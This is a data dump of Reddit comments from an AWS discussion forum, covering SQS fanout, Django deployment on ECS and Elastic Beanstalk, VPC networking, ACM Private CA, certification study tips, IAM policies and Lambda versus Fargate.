g6sijqm,iwqhpi,"hmm. this is interesting. I thought it's common that multiple services (each is one consumer, but can be multi machine of course) will need to subscribe to the same topic (I'm mis-using concept in pub/sub just to make sure I express my question right). For example, your mutation message might need to trigger some updates on many different places (indexing, dynamodb, memcache, other services etc). How I can support this case if message become invisible for some time after gets consumed?

What about when the message gets acked? I guess it will disappear from the queue?",1.0
g61zakm,iwqhpi,"I think with SQS only one consumer gets a given message. For multiple consumers, you need to hook up multiple SQS queues to a SNS topic.",2.0
g6sipm4,iwqhpi,Isn't that a common use case tho?,1.0
g6u04oo,iwqhpi,"It is, and combining SQS and SNS is the common solution. Surprised me at first too. Coming from Azure, I was used to Service Bus which had Queues and Topics built in.",1.0
g62y6t7,iwqhpi,"Standard SQS is not in-order, and SQS does not track which consumers have processed what message. Consumers request messages up to the max batch size and SQS will return what it has in any order (i.e. if you request 10 messages and the queue only has 5, you get 5).

SQS does also have a FIFO mode. Each consumer will get the next in-order message or messages when it requests to receive them.

As /u/joelrwilliams1 says, receiving a message causes it to become invisible until the consumer deletes it or the visibility timeout elapses.",1.0
g6sj988,iwqhpi,"I guess my usage of ""consumer"" makes the question confusing. I was referring consumer to a single service (can be distributed of course) which consumes the message for a single purpose.

For ""multiple consumer"", I meant that message needs to be delivered to multiple services who are listening to this topic, and need to do some updates in their own context.

Does this make sense?",1.0
g6us32f,iwqhpi,"SQS doesn't cater for this use case directly - it's a simple queueing service. If you have multiple services that need to act on a single message asynchronously you could consider the [SNS/SQS fanout pattern](https://docs.aws.amazon.com/sns/latest/dg/sns-common-scenarios.html).

If the services need to consume the message in some kind of sequence, you could consider a Lambda subscriber to the queue that triggers a step function.",2.0
g6v26pa,iwqhpi,"&gt;SNS/SQS fanout pattern

This is great resources. I didn't think of they supporting it in such way. Thanks for pointing it out.",1.0
g63zt5t,iwqhpi,"
SQS only guarantees that your message is only delivered at least once.  It can delivery the message multiple times. This means that on the client side you need to dedupe if that is a requirement.  The other option is to use SQS FIFO queues does in order exactly-once processing.  However, the 2 downsides to FIFO is increased cost and scalability. But if you are under the 300 API calls per second it is a good option.

And yes, with standard SQS you can have thousands of producers and consumers without a problem.  SQS scales on the back side by spreading your queue across a large cluster of shared SQS servers.  

The documentation on short vs long polling gives you an overview of how SQS is architected internally.
https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-short-and-long-polling.html",1.0
g61xrvo,iwqhpi,https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/welcome.html,0.0
g61j669,iwnk2z,"You could utilize ECS along with an application load balancer and application auto scaling. I’ve used ECS Fargate for Django before with great success. If you don’t have your Django project dockerized already, you can look into using gunicorn as the web server, and offloading static files to s3. My only complaint with application auto scaling would be that it can take about 3 minutes to register enough data points for the cloudwatch alarms to trigger the scaling",1.0
g61oh51,iwnk2z,do you have any idea how that would compare to other tools like elastic beanstalk and lightsail? im trying to better understand the pros and cons of each because its all really confusing for me right now. thanks!,1.0
g62eiya,iwnk2z,"Sorry, I haven’t used lightsail or elastic beanstalk much myself. But from what I understand, those two would manage a lot more for you relating to scaling, databases, etc. so the trade off might be less customizability but less overhead and complexity in your architecture.",1.0
g62eqci,iwnk2z,"perfect, that's exactly what im starting to understand as well. thank you!",1.0
g62z19l,iwnk2z,"Elastic Beanstalk has native Support for WSGI apps and can be easier to deploy because you just need to create a ZIP Archive, Upload to S3 and create a deployment. It also automatically installs your dependencies and when using ebextensions you can customize your environment to deploy stuff like SQS queues etc. I also like the health reporting and the ability to deploy web Services as Well as worker environments. Downsides are that deployments can take very long and compared to a raw EC2 deployment its not super flexible. 

All in all its a nice Platform. 

If you are already dockerized, look at Beanstalk Docker environments or ECS Fargate.",1.0
g63yvwl,iwnk2z,"got it, thank you!",1.0
g61o76o,iwnk2z,"I’m thinking either lightsail, or if you want to step away from infrastructure management maybe elasticbeanstalk? https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/create-deploy-python-django.html

Disclaimer is this is all hearsay - but AWS did advertise that ELB can handle scalability well and abstract away a lot of instance management for you so you can focus on just application code.",1.0
g61onm2,iwnk2z,thanks! yeah ive been looking through that which sounded like it could work but im trying to understand how it differs from using other tools such as ECS and lightsail. do you know if its just abstraction or is something like ECS meant for handling larger apps?,1.0
g623yuz,iwnk2z,"Use ECS if you want to use docker. 

Use Elasticbeanstalk if you don’t want to use docker. It deploys it to an ec2 instance and automates a lot of the management for you. 

Most people are moving towards docker nowadays but it is another thing you have to learn

I’ve used elasticbeanstalk a lot and if someone asked me what they should start with I would point them to beanstalk. 

Docker is for more advanced users IMO.

Although another good option for beginners is to use the ecs cli to deploy an application. But you will still need docker knowledge

https://aws.amazon.com/blogs/containers/announcing-the-amazon-ecs-cli-v2/


From what I know of lightsail it goes a step farther and installs software on the instance for you. Like if you want a wordpress site it would set it up for you. It’s has a narrow use case for setting up specific sites for beginners.",2.0
g62e3rf,iwnk2z,"this is really helpful, thank you!",1.0
g62ivt0,iwnk2z,"I recommend giving ELB a try first - since it requires less DevOps efforts on your end to set up load balancer, EC2 maintenance etc. ELB can scale up really well. In the meantime, learn docker - you should be able to containerize and deploy your stack on ECS after one full day of learning and trying. Docker gives you more flexibility in composing your app stack - but also be prepared to spend more time with DevOps to support your stack on top of writing code.",1.0
g62j92l,iwnk2z,"got it, thanks! i do have some experience with docker but will definitely explore deploying with it more.",1.0
g61ccuf,iwmji8,"**Note: I am fairly inexperienced with AWS compared to most of the other visitors on this subreddit; take that as you will.**

As far as I know, with regards to performance and cost, there is nothing different between using one CloudFront distribution for both buckets and using one CloudFront distribution for each bucket. At the end of the day, your data will eventually be pulled from CloudFront by your users, and will eventually be grouped into one CloudFront data egress group.

However, there is (at least a small) benefit that you can gain from using two separate distributions: customization.

As far as I know, with CloudFront, certain settings can only be applied across an entire distribution. For example, as far as I can tell, anything under the ""General"" tab when looking at your distribution's settings in the CloudFront console can only be applied distribution-wide; this includes things like price class and distribution status.

Using separate distributions would allow for something like this (this is just an example; I don't know the specifics of your setup): one bucket holds your site's text-based stuff (i.e., HTML, CSS, and JavaScript), while another bucket holds your site's larger files: pictures, dowloadables, etc.\*

Setting up your distributions so that one points at your text stuff and another points at your large file bucket, this would allow you to specify, for example, your text distribution can utilize edge locations all around the world, but your large file distribution can only use the 'cheap' edge locations (the locations in the North America and Europe).

This is just an example of why you *might* want to use two different CloudFront distributions. However, at the end of the day, price and performance wise, there almost certainly no difference between using one distribution and using separate distributions.

As I stated before, this is all based on my, rather limited, experience with AWS and what I can infer based upon that experience.

\*Now, *why* you might have your site setup this way...I don't know; I'm just making up an example.",1.0
g61mcqb,iwmji8,"Wow thanks for the long reply! I also don’t know much about this (hence the question), but it seems like what you said made sense lol. I’ll go with 2 distributions for now, thanks!",1.0
g5zu3sl,iwgs3o,"AWS is the platform.

Red Hat Enterprise Linux is a choice of operating system you can run on it.",2.0
g5zu60j,iwgs3o,"because you can run any linux or windows on EC2. Making it flexible allow people to jump into aws with low efforts. 

Actually there are many reasons to use own base OS, mostly due to security and included stuff, which each company have own",1.0
g5zuhqe,iwgs3o,"Redhat is just a Linux distribution. You can spin up an ec2 instance with any operating system you want - windows, redhat Linux, Ubuntu Linux, Debian, etc. One reason you might choose red hat is because of the companies reputation for a very stable product that can come with a support contract if you buy it. Redhat also has other Linux based products that obviously work very well with their own distro, so again, its like guaranteed stability.",1.0
g5zutge,iwgs3o,The same reasons there's Ubuntu and other linux flavors on AWS. People have ones that they favor. RHEL is one of those that is heavily favored in the enterprise world.,1.0
g602hnx,iwgs3o,"AWS EC2 is just a virtual computer instance running in the cloud. Amazon give you a lot of freedom as to what you run on that computer, Windows, Linux, etc. 

Linux comes in a variety of distributions, such as Red Hat, Ubuntu, Debian, Fedora, and many others. Amazon even makes their own Linux distribution. These distributions can be quite different in terms of of administration tools and user experience (even if they all use the same Linux kernel behind the scenes).  There is no “right” answer as to which one you use. 

Many “serverless” AWS services are running a set of Linux servers behind the scenes. All that complexity is hidden from you with something like Lambda.",1.0
g6052zo,iwgs3o,"AWS is a universe.

Red Hat is a planet.

---

""Red Hat"" is a company that makes a product called Red Hat Enterprise Linux or ""RHEL"" for short, and they're also maintainers of a free and open-source linux distribution called CentOS. It's basically RHEL.

They make most of their money by selling support contracts to enterprise customers. They're worth about 34 billion dollars.


---

AWS is not just a platform where you deploy your code. AWS is a platform where you deploy your entire **data center**.

Let's say you need a server. One command, and you have a server running in AWS. Need 100 servers? Same command. No purchase orders. No wait for shipping. No installation period. They're just there... ready to go in a matter of minutes... if not seconds.

Let's say you need to connect all of your servers together. In a real data center, you'd need to buy a $50,000 switch and pay $20k a year for the vendor to support it.

In AWS, all of that is handled. The only networking fees you'll pay are ""data egress"" -- or data that *leaves* AWS, ie. any time a customer requests your website... and then VPN fees and a few other cases.

All of AWS's services are some combination of the two ideas:

1) Software AWS has developed that's either A) cheaper to license than the competition or B) runs better in a cloud environment than the competition or C) both.

2) Different ways of logically dividing and paying for infrastructure.


Lambda is mostly just a way of dividing up infrastructure to run your code without thinking about the server it is on.

DynamoDB, on the other hand is a database developed by Amazon to run more effectively and cheaper in a cloud environment... it competes with other key-value stores and document databases like mongo.

Remember the company valuation of Red Hat was around 34 billion dollars?

AWS **revenues** were about 35 billion dollars. In 2019 alone.

If AWS were a standalone company, it would probably be worth upwards of 600 billion.",1.0
g60pe5a,iwgs3o,"I'd modify your analogy a bit: if AWS is the universe then accounts are galaxies, VPCs are solar systems and EC2 instances are planets. Red Hat or any other OS would be *types* of planets, like gas giants or life-supporting or whatever. 

But also if AWS is the universe we hopefully live in a multiverse...",1.0
g611ovv,iwgs3o,"The analogy was meant to be about the companies themselves rather than AWS 'cloud' vs Red Hat the operating system.

Red Hat is just one of thousands of companies operating on top of AWS.

It breaks down a bit the more you look at it... but it was meant to convey the scale difference.... Red Hat makes half a dozen products... RHEL, OpenShift, etc.

AWS has over 200 now.

Another analogy I thought of was ""AWS is an ocean. Red Hat / IBM sells people engines for their ships.""",1.0
g64yoz9,iwgs3o,"lambda and EB are the parts of AWS that makes you not have to think about servers where they just deal with all of that.  


If you want to deal with servers they have things like EC2 where you can have whatever server you want, and run 2000 windows computers and 26 ubuntu computers and 500 red hat computers all at once if you want. red hat linux is just one kind of linux you can run that is generally really popular. But if what you are doing doesn't care about server stuff you use lambda and it keeps all that stuff secret and has the guy at AWS do it for you.",1.0
g5zutov,iwgap1,"That error is not from the API itself but more because you are making a request over HTTPS and your local OS has out of date root certificates or is missing a root certificate.

Make sure the host you are running this from has up to date CA certs.
You can also check to see if you trust Amazon CA certs.

Here is a great blog post from 2018 around how to check if your OS does:
https://aws.amazon.com/blogs/security/how-to-prepare-for-aws-move-to-its-own-certificate-authority/",2.0
g608ms0,iwgap1,"Also, certificate error are common with bare  docker containers , you may need to install ca-certificate",1.0
g5zvt9u,iwfi95,Just passed Cloud practitioner exam and now studying for Solutions Architect. Thanks for sharing,12.0
g60dums,iwfi95,"Congratulations!!! Pass mine on September 6 and now studying for SAA.

Happy Learning :)",2.0
g60qw2g,iwfi95,Keep up the streak! You can do it.,1.0
g60qq8g,iwfi95,Glad to help. Wish you the best :),1.0
g5zppya,iwfi95,"thanks man, now its my turn to be a certified solutions architect :)",6.0
g60qo5y,iwfi95,You can do it! Wish you the best.,1.0
g60wgb0,iwfi95,I'm still kinda wondering why these exams can't be taken online. Would take them in a heartbeat but kinda don't wanna go somewhere to take an exam for a while after finishing my finals this summer.,3.0
g60xeg0,iwfi95,All AWS Certification exams can be taken at home.,8.0
g610eo2,iwfi95,"Hm, it only said on-site for me but on my country specific page it also says online. Weird. 

How is the online exam? I can't image it'd be comfortable to do a test while someone watches you intently through your webcam.",1.0
g611aud,iwfi95,"Meh. I've taken a couple of online tests (CKA and CKAD). The WebCam isn't an issue but at least for those tests, everything but the main screen had to be covered by a sheet or towel so it's not like there were any distractions :)  I'm going for my first AWS exam here in a couple of days. As long as the proctor isn't interrupting constantly, it shouldn't be too big a deal.",1.0
g60kxmj,iwfi95,"It's interesting that your first recommendation is to take the ACG course - the highest upvoted post from yesterday was saying that ACG's course while it will let  you pass the certification, will not give you enough ""real experience"" learned in order to qualify for a job. 

Conversely, Adrian's course would. 

How do you feel about that anecdote?",5.0
g60s040,iwfi95,"If I remember correctly, I think when I was preparing for SAA, Adrian's course wasn't that popular here. ACG seemed to be the best option to me at that time. But you're right, the ACG course isn't perfect and I've mentioned its flaws in my post too. I had to combine that with the Jon Bonso practice tests to get a good grip on the concepts, and even then I wouldn't say I had the best practical experience. To be honest, I got most of my practical experience after got the certification, through personal projects. 

So yeah, if the current consensus is that the Adrian course is the better one, then go with that. Keep in mind that the practice tests matter the most.

Another thing I should mention is that the test seems to have been updated recently if I'm correct. My preparation (and notes) are of the previous version. Nevertheless it should still be helpful as the core concepts aren't going to change.

Thanks for asking as it's a good question. Wish you the best in your AWS journey!",5.0
g61a31f,iwfi95,"I still think there's merit in taking the ACG and then filling in the gaps as you see fit as opposed to diving into something extremely comprehensive. Thank you for sharing what your journey and I'm sure that will definitely help others like me who are trying to follow the same path. 

&gt;I got most of my practical experience after got the certification, through personal projects.


This is awesome of you to pursue that on your own, that's telling of one's dedication to truly learn. I think we can't expect either of the courses to be perfect; if one loves something they'll learn it themselves. 

For personal projects did you find a good resource for it? I'd imagine it'd be similar to labs",2.0
g60rkf2,iwfi95,"I took the ACG course when transitioning from an on prem job to a strictly AWS DevOps role and the only thing I wish it covered was CloudFormation.  

To be real with you the exam is mild marketing wank from the get go to just give you a surface level understanding of all the products.  That being said knowing all the products allows you to dig in further when the time comes.  I had no problem running a global SaaS platform in AWS 6 months after starting.",2.0
g61a0kc,iwfi95,I have the same feeling but not cloudformation though,2.0
g61l1i4,iwfi95,TF?,1.0
g608lbv,iwfi95,Are you currently working in? May I know how much monthly salary aws solutions architect makes?,2.0
g60bc5c,iwfi95,"If you’re looking for actual AWS employee salaries, go to levels.fyi",3.0
g61lvzp,iwfi95,"$100,000 minimum market compensation. 

* IF YOU KNOW YOUR SHIT.

Not just have the certification but be able to build, configure, and monitor an enterprise application/environment/infrastructure.",3.0
g630sdc,iwfi95,"Is it possible to learn n give exams online with less expensive options, don't have much money rn. Would love to learn aws in detail.",1.0
g60s9b4,iwfi95,"I haven't entered the job market properly yet, I'm still a student (graduate CS). But the cert did help me grab an internship despite having relatively lower GPA. 

As for salaries, I'll let someone else having more experience in the industry chime in.",1.0
g62gjz4,iwfi95,Excellent. Thank you for this.,1.0
g63otr7,iwfi95,can I refer to notes I've made whilst studying when I take the exam? (ie is it closed or open book exam?),1.0
g63w23k,iwfi95,Closed,1.0
g5z8ybo,iwc30u,"To answer your questions:

1. no vlan support, traffic will be dropped as soon as it reaches the cloud networking fabric.
2. not really. You probably need to look at transit gateway for a \*similar concept\*
3. no, you would need different VPC to ""emulate"" different VLAN in tradditional networking.
4. Strictly speaking, Subnet routing is regulated via route tables, and there is a default local route that allow traffic for all VPC. This default local route cannot be removed.4bis) However, you can do ACL/Security group to disallow connectivity between instances on the same VPC or subnet.

&amp;#x200B;

Cloud networking is very different from tradditional network, especially at the layer 2. This is mostly due to the fact the network is actually emulated and also has a very different lifecycle (easy to add/delete a between instances). To be honest, VLAN is functionally similar to a VPC and not a subnet. Everytime you would create a new vlan, you probably need another vpc.

For ""trunking"", you probably need to have a look at transit gateway, that allow connecting/redirecting traffic between VPCs.

If you want to keep the VLAN stack, you need an overlay network between instances.",6.0
g5ztnzm,iwc30u,"u/chesterfeed Thank you for the prompt response.  
This information removes all the fog we had on VPC networking.  Our effort is to deploy private cloud appliance on  AWS with EC2 and VPC. We had two options for the network integration.

  
1- With Overlay networks- Deploy both L2 and L3 functions inside the appliance virtually and redirect all traffic through VPC (but the roadblock was when packets originates from VPC unknown IP/MAC as L3 routing happens inside EC2)

  
2- Only do L2 functions inside appliance and depend on VPC for L3 routing.  


The second method looks more efficient for us,, but when thinking of muti-tenancy in networking for applications inside the appliance, we had to depend on VLANs (especially since L3 routing is removed from appliance).   


But, as VPC does not support this feature we have to look for other options. However, thanks for your response. It helped to remove the vague we had.

  
Good Day!",2.0
g65k7iw,iwc30u,"With metal instance, you can have up to 750 private ip per instance (that you can assign to nested/virtualized nodes). You probably need to proxy arp in the host in this case. 
You need to encapsulate L2 somehow if that needs to happen between ec2 instances.",1.0
g61v7d4,iwc30u,"You might find this usefull:

[https://aws.amazon.com/blogs/apn/amazon-vpc-for-on-premises-network-engineers-part-two/](https://aws.amazon.com/blogs/apn/amazon-vpc-for-on-premises-network-engineers-part-two/)

You can preserve L2 information inside the aws cloud by installing FRR within the instance and using xVLANs.",1.0
g62nxrf,iwc30u,"Simple answer- it wont work. 

vpc subnets are not true layer 2 network. They provide an impression of a layer 2 network. 

Now imagine, you create a vlan tagged interface on your ec2 which is accepting vlan 100. It sends out a dhcp message, which will get dropped because it doesn't   understand  Vlans.

Ultimate result you would loose connectivity to the instance.

Just curious what are you tying to do with SDN ? If it's a northbound application, normally you wouldn't care about L2 connectivity.",1.0
g60o0ed,iwc30u,"I don't understand your question TBH. 
Cisco's ACI will get this done for you: 
 https://www.cisco.com/c/en/us/solutions/collateral/data-center-virtualization/application-centric-infrastructure/white-paper-c11-741998.html

AWS is serverless for the most part and your data center is a physical  appliance, you can't couple them together with XVLAN. Look into Terraform or a similar IAAS solution.",0.0
g611xoh,iwc30u,"AWS has bare metal through server less and everything in between.

There's features for building hybrid clouds and configuring virtual networks.  Third-party solutions exist for these scenarios, but might introduce additional overhead for specific use cases.

Instead, consider starting with a threat model and identifying desirable routes and segments.  Then place controls through stateless and stateful firewalls (NACL and security groups); isolation barriers (vpc, subnets, and accounts); along with shared boundaries (vpc peering, direct connect, ...)",0.0
g61a1mi,iwc30u,"&gt;Then place controls through stateless and stateful firewalls

I get the general idea of how VPC design should work. Public VPC for WEB apps, Non-public VPC for databases and a jump host, NatGateways and all that stuff. 

For the life of my I still can't figure out why AWS wants us to create non-heretical topologies, full Mesh peering because VPCs are non-transitive. Why can't I just use traditional network design methods?  For example, each EC2 instance connects to L3 switch/NGFW Gateway and then route from there. Full mesh gets exponentially more complicated as I add more nodes and that's not scalable.",1.0
g5yfwcc,iw6mql,"[ACM's Private Certificate Authority](https://aws.amazon.com/certificate-manager/private-certificate-authority/) is built for this use case. Not exactly cheap, but way more convenient than doing it yourself.",3.0
g5zp957,iw6mql,"That’s the service I was referring to.  However, it doesn’t seem to offer all the services I asked about.

I found this video posted over a year ago that says they are considering adding those features, but I can’t find any information that says they have actually started implementing it or plan to offer it anytime soon.  

If these features are coming soon, then we want to wait for it instead of setting up our own CA.

Check this video where they start talking about it at 13:05.

[https://youtu.be/7dRlN-qZvaA?t=785](https://youtu.be/7dRlN-qZvaA?t=785)",1.0
g5zt4yb,iw6mql,"Since ACM Private CA doesn’t currently have any integration with ADCS for autoenrollment or even with any other tools we could use to bulk enroll and distribute client certificates to PCs and mobile devices (such as SCCM or MDMs like Intune), does ACM Private CA have another method to automate bulk distributing client authentication certificates?

Until it can be a complete replacement for setting up our own internal Microsoft PKI, I don’t see a use case for us.  We would have to then have both ACM Private CA for server certificates plus our own internal Microsoft CA to handle client authentication certificates.

We would be better off just using the Microsoft CA for everything.",1.0
g5ypcto,iw6mql,"ACM certs are good only for AWS *services* (like ALB and CloudFront), you can't apply them to web servers.",2.0
g5zpvrb,iw6mql,I meant “ACM Private CA” which does appear to be meant to be used for other internal uses.,3.0
g5x9irq,iw6mql,No. AWS doesn't give you the key for the cert.,1.0
g5z0sq3,iw6mql,Are you sure?,1.0
g5zeyke,iw6mql,Only if you use their private ca,1.0
g5zpidh,iw6mql,"I found this 2019 video stating they are considering all the features I asked about, but I can’t find any information on whether they are following through and releasing it anytime soon.

The talk about those features starts at 13:05 into the presentation.

[https://youtu.be/7dRlN-qZvaA?t=785](https://youtu.be/7dRlN-qZvaA?t=785)",1.0
g5ztdfb,iw69k6,What do you mean about removing dots from bucket name?,1.0
g60m58g,iw69k6,"There’s this longstanding thing where dots in a bucket name interfere with making requests to the api if the URL is of a certain format. I think they get confused as subdomains or something. 

I changed the bucket from company.environment.athena-results to company-environment-athena-results and it solved the error number 51",1.0
g60ote3,iw69k6,Thanks. I am having same error but sadly not dots in the bucket name.,1.0
g6akkwq,iw69k6,Its hard to debug but i would say try making the bucket have the most lax permissions possible to ensure its not some dumb IAM thing. Be totally sure the IAM role assigned to the RDS instance is correct and be totally sure that the security group on that instance allows port 80 and 442 out to the public internet.,1.0
g5wk13v,iw4x20,"Easiest way? Throw the entire thing into a Lambda. 

https://www.serverless.com/blog/serverless-express-apis-aws-lambda-http-api",5.0
g5wt1rp,iw4x20,"This is the way. Cheaper (and potentially easier, depending on a couple factors) than Beanstalk.",1.0
g5wtvgp,iw4x20,"Sorry that was the wrong link. This is the AWS native solution without using the Serverless framework. 

https://github.com/awslabs/aws-serverless-express",1.0
g5wl708,iw4x20,"Beanstalk should work. Are you using express server? Beanstalk will run 'npm run start' script to start your application . Also, make sure config your port server with env. I.e  ' const port = process.env.port || 3000 ' 
Try a get that send as response hello world msg",1.0
g5wois7,iw4x20,"I am not exactly sure because this is my first experience with Node js. This is the guide I used to set my stuff up: [https://developer.okta.com/blog/2019/03/11/node-sql-server](https://developer.okta.com/blog/2019/03/11/node-sql-server)  


Are you able to tell from this? My project is a replica of this, except with the connection to my AWS database for the credentials and my functions.",1.0
g5wqdtd,iw4x20,"The guide is using hapi, but should work.

Try:const config = {host: ""localhost"", port:  process.env.port || 8080 }

In package.json add a script ""start"": ""node .""

are you zipping the project and uploading to beanstalk?",1.0
g5yselm,iw3z7h,"same here. tags, enforcing tags, tags pointing to people that have since left the company, inconsistent tag name and value casing.  abandoned resources (ec2, certs, domains, kms keys), buckets created with poor permissions, duplicate roles and iam policies sprinkled all throughout an accounts resources.

recommendations if you are just starting with a sizable company.  use aws organization and all the governing mechanisms it provides tie into aws sso leveraging existing IdP (ms [azure] ad, etc.), and aws config.

the pattern i see, is company’s start small with aws using the aws console manually, make a mess, then discover the aws services that solve these issues, then a slow and painful migration to them breaking things along the way.",3.0
g5w9krc,iw3i24,If you mean Ground Station it is to downlink data from your satellite directly to AWS so you don’t need to truck it in with Snowball/Snowmobile. Probably not what you are looking.,3.0
g62re08,iw3i24,They can send a snowmobile up to a satellite?,1.0
g60dzpw,iw1wgx,"What does your ""nightly update"" entail?  Could you run it on a separate machine?   If you can, look into AWS Batch or ECS Scheduled Tasks with Fargate.",1.0
g60npvo,iw1wgx,"In entails downloading a bunch of data from an API as a pandas dataframe, crunching a whole bunch of numbers to modify the dataframe, writing it out to a csv and then reading the csv into my postgres database to update relevant data.

I'm sure it could run on a separate machine but I don't see how that would be any better, cause it would still require me to run another one right? I'm working on the code right now to reduce the memory usage which I see a lot of potential to do, but if that doesn't work I'd still need to spin up a more powerful instance each night

I'll look into those services you mentioned regardless though to see if they might be applicable to my situation. Thanks!",1.0
g60rgt3,iw1wgx,"The idea is the larger, separate instance would only run for the 15 minutes each night needed for the update. Fargate or Batch can help facilitate that, although you could make it work with plain EC2 (instance is shut down for the day, Cloudwatch alarm starts it, processing runs and then shuts it down)",1.0
g6187sy,iw1wgx,Yeah - that's what I'm trying to figure out how to do. I can't figure it out using elastic beanstalk. I'm gonna check out Fargate and Batch. Do you have any docs you could point me to on the cloudwatch alarm route? I think that might be the most relevant to my setup right now. Thanks again!,1.0
g61chy0,iw1wgx,"Here’s a couple. Just configure the update to run on boot, and shutdown when done. 


https://aws.amazon.com/solutions/implementations/instance-scheduler/

https://aws.amazon.com/premiumsupport/knowledge-center/start-stop-lambda-cloudwatch/",1.0
g61m1jk,iw1wgx,Thank you! Gonna dig into this tomorrow and figure this sucker out.,1.0
g5v2kw3,iw0fz2,"It's the EC2 instance that's performing the action so it is the one that needs to use the role. Otherwise if the role was on CloudWatch Logs itself, how would you only let certain instances write logs?",3.0
g5v5eyf,iw0fz2,"You are correct, but I'm trying to understand why the AWS design is inconsistent (in my view). It's as though they designed two different and opposite architectures for the way IAM roles work.",1.0
g5v5r3w,iw0fz2,I don't understand what inconsistency you're referring to. In both cases the actor performing the action is the one using the role.,3.0
g5v6rsw,iw0fz2,"I don't know about that, since scenario 1 seems like the opposite.... or wait. hmmm. I think you are right. I need to think about it. thanks",1.0
g5v7u48,iw0fz2,"Maybe it's the bucket policy that's confusing here? That is different than normal IAM roles because the policy is on the bucket and lets other accounts read objects. It's a separate access mechanism than roles. They do have that in some other places where it fits. API Gateway, for example, has API keys and usage plans.",1.0
g5vm6hf,iw0fz2,"You may be confusing resource policies and identity policies.

An S3 bucket policy is a resource policy.  It defines permissions on the AWS resource it is assigned to.  The same can be done for other AWS resources like lambda, SQS, SNS, etc.  the permissions in resource policies are used to allow other resources or identities to use that resource.  The resource does not run with those permissions.

An identity policy is attached to an IAM role, user, or group.  IAM roles can then be associated with AWS resources like EC2 instances, lambdas, APIs, etc.  When AWS resources use roles they run under the permissions provided by those roles.

The differentiator is whether the resource runs with permissions (identity policy) or allows other identity / resources to use it (resource policy).",3.0
g5whb5j,iw0fz2,"What are the policy types that we have ? (humor me)

Resource Policy (Execution Policy for Lambda, Bucket Policy for S3, etc.)

Identity Policy ( are permission policies for IAM Users and IAM Roles and IAM Groups)

Trust Policy (for IAM roles only)

Policy types can be inline, aws managed or customer managed.

anything else I'm missing?",1.0
g5wmyb8,iw0fz2,"A lambda execution policy is actually an identity policy since it’s attached to an IAM role.  However you can also assign a resource policy that defines access to the lambda from other identities (just like a S3 bucket policy).  

You are missing Service Control Policy (used to define permissions in AWS Organizations), session policies (used to reduce the permissions for a given set of temporary session credentials), boundary control policies (used to restrict the permissions of an identity).

Not sure if that’s all of them.",1.0
g5xamoy,iw0fz2,"Thanks, yes, there are also boundary policies indeed. I going to try to find some article that gives a birds of view of these things and how (or why) and the philosophy of their design.

It looks to me like it's more complicated than it needs to be. I think it's because I'm missing some logic.

&amp;#x200B;

Edit: I think I found it under policy types [https://docs.aws.amazon.com/IAM/latest/UserGuide/access\_policies.html](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html)

Cheers.",1.0
g5zbyau,ivzrmd,"might be good to see if a single or composition of the higher level aws ml services can meet your needs.  such as aws personalize, forecast, rekognition, etc.

if they don’t fit, you can drop down to sagemaker for a custom model.

one you have a trained model, see if you can run on lambda vs container or server.  reduced costs and operations.  see https://aws.amazon.com/blogs/compute/building-deep-learning-inference-with-aws-lambda-and-amazon-efs/",2.0
g5w4dsk,ivzrmd,Pm me,1.0
g5vjjtc,ivzqui,"Contact your AWS support and tell them you've been cheated on.

They should either provide you with the rest of the money or provide an explanation to why you didn't have that money.",1.0
g7bglhz,ivyg4f,"Thank you to everyone in this thread that has provided their feedback and perspective. As stated earlier, the intention in retiring some of the Linux Academy content was simply to provide our students and customers with the latest and highest quality course material. However, in the weeks since, we have heard you loud and clear that we need to keep these older courses available on the Linux Academy platform.

In response to feedback from the Linux Academy community, as of Oct 1, we are extending access to many legacy courses on the Linux Academy platform through the end of the year, and will keep you informed as updated courses become available. Be sure to check the course descriptions for links to newer content as it is added (or has already been added).

If you log into your Linux Academy account, you can find the courses that were previously retired in the categories you would expect. Please remember if you have any questions or have any difficulty, we are always available at [support@linuxacademy.com](mailto:support@linuxacademy.com) to help you along your learning journey!",1.0
g5usnl6,ivyg4f,"Do you have any further evidence or details, /u/penistip469?",-2.0
g5uyir4,ivyg4f,"Yes, if you have access to the courses you can verify yourself. If you don’t have access to the courses then see the post by u/acantril, he created some courses on LA and posted that his course is no longer there.",2.0
g5vlqi6,ivyg4f,"It's a difficult process to merge two content libraries. My response to the DevOps course removal is simply we have both online. It's not removed it's just split into 4 mini courses until we can do a proper merge. 

https://i.imgur.com/x8sDVsY.png",-1.0
g5urfqv,ivz7mn,"You need a serious redesign. Why so many cores?? 

If you can't wait for it to spin up, keep it running. But what happens when you reboot for a kernel upgrade or the instance has a hardware issue? You'd be better off using API gateway and an ALB to load balance across 3 zones and have 4+ cores per instance. Even an autoscaling group that keeps one running and fires up the others when there are requests.

When you do that sort of thing you can use a spot fleet with 8core instances at a fraction of the price and if one dies one in another region takes over.

If you want to stick to your original.plan, pay for a full up front reserved instance. Then the price you pay covers running that instance a whole year. 24x7, 100% cpu utilisation. (Or for 3 years if you prefer)

But then if they release a faster cheaper cpu in the year, you're stuck on the old one.",2.0
g5uwzc6,ivz7mn,"Go serverless. Lambda if it’s a small job, far hate if it’s big",2.0
g5w8ndq,ivz7mn,Lol far hate on fargate? Damn you auto correct!,3.0
g5xvzux,ivz7mn,"This dude's reply gives what you need, which is on-demand computing. It runs the code only and doesn't need a host running the code. This is the point of using 'the cloud' which is instantly ready and scalable service. If you have a sudden influx of traffic, you can use the load balancers and whatnot to increase/decrease as you need, otherwise, like the other guy said, you'd need to pay for a reserved instance. If your needs suddenly change, you'd be stuck with that reserved instance.",1.0
g5zumz5,ivz7mn,"A little confused. I understand for Lambda you pay only for the amount of time it costs to compute your function and there is no “spin-up” time.

With Fargate, their description says it’s about running *containers* in a serverless manner. So does that mean whenever there is a compute request, a container is going to to “spin up” and process that compute on an ECS or EKS? Or is a container running constantly on the backend just waiting for a request to come? 

Ideally the latter for my use case but want to confirm.",1.0
g60hcgf,ivz7mn,"Fargate is more akin to EC2, it runs 24/7 waiting for a request to come.",2.0
g60jixf,ivz7mn,Thank you. And the pricing in this case would be 24/7 then too regardless of how many compute requests I get? That’s the piece that gets me. It isn’t truly “serverless” because you are paying for a server running 24/7 just waiting for a request to come...,2.0
g60kvcz,ivz7mn,"Yeah, you pay the full time it’s running. Whether it counts as serverless depends on who you ask. It definitely doesn’t have a serverless billing model.",2.0
